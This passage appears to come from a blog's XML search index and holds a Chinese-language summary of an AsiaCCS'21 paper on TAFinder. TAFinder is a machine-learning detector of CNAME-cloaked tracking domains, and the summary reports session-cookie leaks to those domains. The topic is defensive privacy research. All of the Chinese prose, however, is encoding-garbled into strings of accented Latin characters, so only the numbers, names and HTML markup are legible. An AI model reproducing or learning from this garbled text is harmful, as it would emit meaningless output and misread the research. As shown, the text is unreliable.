id="åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹-1"><a href="#åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹-1" class="headerlink" title="åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹"></a>åŸºäºæœºå™¨å­¦ä¹ çš„æ£€æµ‹</h2><p>TAFinderæ˜¯é ä¸€ä»½T/Aåˆ—è¡¨ï¼ˆæ¥æºåŒ…æ‹¬äº†å·²è¢«æ ‡è®°çš„ç¬¬ä¸‰æ–¹åˆ†ææœåŠ¡æä¾›å•†å’ŒVirusTotalç­‰ï¼‰æ¥æ ‡è®°è¦æå–çš„éšåŒ¿åŸŸã€‚åŒæ—¶ï¼Œæ ¹æ®VirusTotalæä¾›çš„ç±»åˆ«æ¥æ ‡è®°æ•°æ®é›†ä¸­çš„åœ¨é‡éšåŒ¿åŸŸã€‚</p><p>TAFinderä½¿ç”¨MitmProxyçš„Pythonæ¨¡å—è§£æè¿™äº›æ•°æ®ï¼Œå¹¶ä»ä¸­æå–ç‰¹å¾ã€‚åŒæ—¶ã€‚é‰´äºæœ‰ä¸€å¤§æ‰¹ä¸åŒçš„cookieåç§°éœ€è¦åˆ†ç±»ï¼ŒTAFinderåªé€‰å–é‚£äº›æœ€æµè¡Œçš„cookieã€‚ä¸ºæ­¤ï¼Œä½œè€…æå–äº†æ‰€æœ‰éšåŒ¿åŸŸçš„HTTPå“åº”ä¸­çš„cookieåç§°ã€‚ç„¶åï¼Œæ ¹æ®å‘é€cookieçš„éšåŒ¿åŸŸçš„æ•°é‡å¯¹cookieè¿›è¡Œæ’åã€‚ä»¥åŒæ ·çš„æ–¹å¼ï¼Œä½œè€…åˆåˆ›å»ºäº†ä¸¤ä¸ªæµè¡Œåº¦æ’åï¼Œä¸“é—¨é’ˆå¯¹éT/Aå’ŒT/AæœåŠ¡è®¾ç½®çš„cookiesã€‚</p><p>ä½œè€…ä»ä¸Šé¢cookieæ’åä¸­é€‰ä¸­äº†æœ€å—æ¬¢è¿çš„25ä¸ªcookieï¼Œä»¥åŠ60ä¸ªéš¶å±äºT/Aå’ŒéT/AåŸŸçš„cookieåç§°ã€‚æ ¹æ®One Trustçš„cookieåˆ†ç±»ï¼Œä½œè€…å°†è¿™äº›cookieå½’ç±»ä¸ºT/A cookieï¼Œç„¶åé€šè¿‡Cookiepediaæˆ–T/Aç‰¹å®šçš„æ–¹å¼è¿›è¡Œè®¿é—®ã€‚åŸºäºè¿™ç§æ–¹æ³•ï¼Œä½œè€…å‘ç°äº†27ä¸ªè·Ÿè¸ªç›¸å…³çš„cookieså’Œ28ä¸ªé»˜è®¤çš„ç½‘ç»œåº”ç”¨ç¨‹åºcookiesã€‚</p><p>ä¸ºäº†å¯¹éšåŒ¿åŸŸè¿›è¡Œåˆ†ç±»ï¼ŒTAFinderä½¿ç”¨Scikit-Learnçš„éšæœºæ£®æ—æ¨¡å‹ã€‚</p><h1 id="æ–¹æ³•è¯„ä¼°"><a href="#æ–¹æ³•è¯„ä¼°" class="headerlink" title="æ–¹æ³•è¯„ä¼°"></a>æ–¹æ³•è¯„ä¼°</h1><p>åœ¨21,184ä¸ªä½¿ç”¨CNAMEçš„ç½‘ç«™ä¸­ï¼Œæœ‰20,504ä¸ªä»…ä½¿ç”¨äº†æä¾›éT/AæœåŠ¡CNAMEã€‚æ ¹æ®Virus Totalï¼Œè¿™äº›éT/Aå¤§å¤šå±äºä¿¡æ¯æŠ€æœ¯ã€å•†ä¸šå’Œè®¡ç®—æœºåŠè½¯ä»¶ç±»åˆ«ï¼ŒåŒ…æ‹¬CDNå’Œè™šæ‹Ÿä¸»æœºæœåŠ¡ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4941ede8-c1f7-4f34-bede-bab062c19044.png"><br>åœ¨è¯„ä¼°Cookiesæ³„éœ²çš„æ—¶å€™ç”±äºæ¯ä¸ªåˆ†æç«™ç‚¹éƒ½éœ€è¦äººå·¥æ“ä½œï¼Œå› æ­¤ä½œè€…å°†å®éªŒé™åˆ¶åœ¨10,000ä¸ªæœ€æµè¡Œçš„åŸŸä¸Šã€‚åœ¨è¿‡æ»¤äº†é‡‘èæœåŠ¡å’Œè´­ç‰©ç½‘ç«™ä¹‹åï¼Œä½œè€…ä½¿ç”¨119ä¸ªåŸŸè¿›è¡Œåˆ†æã€‚å…¶ä¸­çš„90ä¸ªç½‘ç«™ä¸Šä½œè€…æ‰‹åŠ¨åˆ›å»ºäº†å¸æˆ·ç”¨äºæµ‹è¯•ã€‚åœ¨è¿™90ä¸ªç½‘ç«™ä¸­ï¼Œæœ‰27ä¸ªå°†å…¶ä¼šè¯cookieï¼ˆæˆ‘ä»¬ç¡®è®¤è¯¥cookieæä¾›äº†å¯¹ç”¨æˆ·å¸æˆ·çš„è®¿é—®ï¼‰å‘é€è‡³éšåŒ¿çš„T/AæœåŠ¡ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/13366964-df26-49df-aae5-18865dffc844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> AsiaCCS&#39;21 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
